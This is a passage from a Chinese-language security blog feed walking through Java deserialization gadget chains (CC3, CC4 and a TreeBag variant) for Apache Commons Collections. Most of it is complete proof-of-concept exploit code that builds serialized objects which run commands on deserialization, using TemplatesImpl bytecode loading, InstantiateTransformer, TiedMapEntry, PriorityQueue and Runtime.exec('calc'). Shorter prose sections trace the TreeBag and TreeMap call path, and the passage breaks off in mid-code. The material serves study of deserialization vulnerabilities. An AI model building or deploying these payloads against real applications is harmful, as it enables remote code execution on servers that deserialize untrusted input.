class_">ChainedTransformer</span>(chainPart);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">proxy</span> <span class="operator">=</span> (InvocationHandler) con.newInstance(Retention.class,outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map)Proxy.newProxyInstance(LazyMap.class.getClassLoader(),LazyMap.class.getInterfaces(),proxy);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> con.newInstance(Retention.class,proxyMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹计算机</p>
<h5 id="结合CC6-1"><a href="#结合CC6-1" class="headerlink" title="结合CC6"></a>结合CC6</h5><p><strong>HashMap链的POC：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;ctf&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        o.put(outerMap,<span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹计算机</p>
<p><strong>HashSet链的POC：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;ctf&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazy</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chain);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">outerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazy,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();</span><br><span class="line">        o.add(outerMap);</span><br><span class="line">        hashMap.remove(<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        in.readObject();</span><br><span class="line">        in.close();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="好处"><a href="#好处" class="headerlink" title="好处"></a>好处</h4><p>首先就是在利用POC的时候一定要<strong>注意java版本</strong>的问题，结合CC6的基本在java7和java8都通杀。</p>
<p>对于使用InstantiateTransformer类，<strong>当不允许使用InvokerTransformer类的时候就可以使用这个。</strong></p>
]]></content>
      <categories>
        <category>Java安全</category>
        <category>Java反序列化调用链分析</category>
        <category>CC3</category>
      </categories>
  </entry>
  <entry>
    <title>CC4</title>
    <url>/2024/08/13/CC4/</url>
    <content><![CDATA[<p>CC4学习</p>
<span id="more"></span>

<h1 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h1><p>ysoserial链中的CC4就只是将CC2使用的InvokerTransformer替换为InstantiateTransformer来加载字节码，具体使用CC3那里已经说过了。</p>
<p><strong>测试环境：</strong></p>
<ul>
<li>JDK 8U411</li>
<li>commons-collections4.0</li>
</ul>
<p>不多说，给个POC结束：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\maven_text\\maven1_text\\target\\test-classes\\org\\example\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">ctf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_name&quot;</span>,<span class="string">&quot;fupanc&quot;</span>);</span><br><span class="line">        setFieldValue(ctf,<span class="string">&quot;_bytecodes&quot;</span>,<span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;code&#125;);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        setFieldValue(ctf, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        Transformer[] fakeTransformer = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),<span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;ctf&#125;)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformer);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priority</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>,comparator1);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line">        priority.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field1.set(chain,chainPart);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        out.writeObject(priority);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.ser&quot;</span>));</span><br><span class="line">        input.readObject();</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj,String fieldName,Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>有点小怪的就是之弹出一个计算机，按照预期应该是两个的，调试器也有点小问题。</p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><strong>测试环境：</strong></p>
<ul>
<li>JDK 8U411</li>
<li>commons-collections4.0</li>
</ul>
<p>这里补充一个对PriorityQueue的替代链 TreeBag。</p>
<p>直接上对类的分析</p>
<h3 id="TreeBag-TreeMap"><a href="#TreeBag-TreeMap" class="headerlink" title="TreeBag&amp;TreeMap"></a>TreeBag&amp;TreeMap</h3><p>在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。</p>
<p>在这里TreeBag也实现了在反序列化时会调用到比较器，所以这里也可以利用。</p>
<p><strong>TreeBag类位于</strong><code>org.apache.commons.collections4.bag.TreeBag</code></p>
<p><strong>稍微说明一下Bag：</strong></p>
<p>Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。</p>
<p>TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。</p>
<p>————</p>
<p>TreeBag 类继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在AbstractMapBag的成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中：</p>
<p>TreeBag类构造方法：</p>
<p><img src="/2024/08/13/CC4/image-20240803184247408.png" alt="image-20240803184247408"></p>
<p>父类AbstractMapBag：</p>
<p><img src="/2024/08/13/CC4/image-20240803184304707.png" alt="image-20240803184304707"></p>
<p>TreeMap定义有comparator：</p>
<p><img src="/2024/08/13/CC4/image-20240803184420506.png" alt="image-20240803184420506"></p>
<p>当对TreeBag反序时：<br><img src="/2024/08/13/CC4/image-20240803184521216.png" alt="image-20240803184521216"></p>
<p>可以看出这里会读取TreeMap的comparator并调用父类AbstractMapBag的doReadObject()方法：<br><img src="/2024/08/13/CC4/image-20240803184738905.png" alt="image-20240803184738905"></p>
<p>这里会调用<code>map.put()</code>，也就是TreeMap的put方法：<br><img src="/2024/08/13/CC4/image-20240803185243394.png" alt="image-20240803185243394"></p>
<p>看我标重点部分，在前面的简单过程中，这里会进入if条件很正常（并且利用点就是这里），这里就会执行compare方法，看一下TreeMap类的compare()方法：<br><img src="/2024/08/13/CC4/image-20240803185405961.png" alt="image-20240803185405961"></p>
<p>只要我们正确定义了comparator就可以成功执行漏洞。</p>
<p>链子不就出来了吗。</p>
<h3 id="两个点需要说明"><a href="#两个点需要说明" class="headerlink" title="两个点需要说明"></a>两个点需要说明</h3><h4 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h4><p><strong>1.父类AbstractMapBag的变量map不可被序列化：</strong></p>
<p><img src="/2024/08/13/CC4/image-20240803190548655.png" alt="image-20240803190548655"></p>
<p>解决方法同样是在TreeBag的writeObject()以及readObject()方法中：<br>writeObject()：<br><img src="/2024/08/13/CC4/image-20240803190720619.png" alt="image-20240803190720619"></p>
<p>继续跟进<code>this.comparator()</code>：<br><img src="/2024/08/13/CC4/image-20240803190912554.png" alt="image-20240803190912554"></p>
<p>然后到会到父类AbstractMapBag的getMap()方法：<br><img src="/2024/08/13/CC4/image-20240803190958442.png" alt="image-20240803190958442"></p>
<p>返回了我们定义的TreeMap实例，所以前面的comparator()中会调用TreeMap类的comparator()：<br><img src="/2024/08/13/CC4/image-20240803191129801.png" alt="image-20240803191129801"></p>
<p>直接返回了我们定义的comparator。所以序列化的时候会序列化我们定义的comparator：</p>
<p><img src="/2024/08/13/CC4/image-20240803191222106.png" alt="image-20240803191222106"></p>
<p>——</p>
<p><strong>那么看反序列化：</strong><br><img src="/2024/08/13/CC4/image-20240803191337611.png" alt="image-20240803191337611"></p>
<p>所以这里又将这个comparator反序列化了出来。</p>
<p>那么这样过后就可以解决transient问题。</p>
<h4 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h4><p><strong>2.也就是for循环不能进去的问题：</strong><br><img src="/2024/08/13/CC4/image-20240803191539867.png" alt="image-20240803191539867"></p>
<p>想要进入for循环，这里与entrySize()有关，而entrySize的值又与in.readInt()有关。</p>
<p>此时同样需要看TreeBag的writeObject()方法，前面还没有分析完：</p>
<p><img src="/2024/08/13/CC4/image-20240803191730066.png" alt="image-20240803191730066"></p>
<p>这里在序列化的时候同样要进入父类一次，AbstractMapBag的doWriteObject()方法如下：<br><img src="/2024/08/13/CC4/image-20240803191838323.png" alt="image-20240803191838323"></p>
<p>一眼出来，就是和这里的<code>writeInt()</code>有关，而<code>writeInt()</code>又与TreeMap的size()函数有关：<br><img src="/2024/08/13/CC4/image-20240803192012114.png" alt="image-20240803192012114"></p>
<p>此时想到了前面cc2对这个size的描述，直接猜一波和add()相干，TreeMap有add方法，但是还是相当关于直接调用的父类AbstractMapBag的add()方法：<br><img src="/2024/08/13/CC4/image-20240803192748071.png" alt="image-20240803192748071"></p>
<p>里面会调用TreeMap的get()方法：<br><img src="/2024/08/13/CC4/image-20240803192936138.png" alt="image-20240803192936138"></p>
<p>这里也就是看是否有值，很显然我们并没有往里面传过值，那么<code>mut</code>就为null，这样就进入TreeMap类的put()方法：</p>
<p><img src="/2024/08/13/CC4/image-20240803193149922.png" alt="image-20240803193149922"></p>
<p>再看put方法源码：<br><img src="/2024/08/13/CC4/image-20240803193320316.png" alt="image-20240803193320316"></p>
<p><strong>这里很自然就会使得size为1</strong>，</p>
<p>——————</p>
<p><strong>但是这里需要注意会调用compare()方法</strong>，前面也说过这个方法了，如果没有设置假的话应该会导致弹两个计算机，测试一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.bag.TreeBag;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] chainPart = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 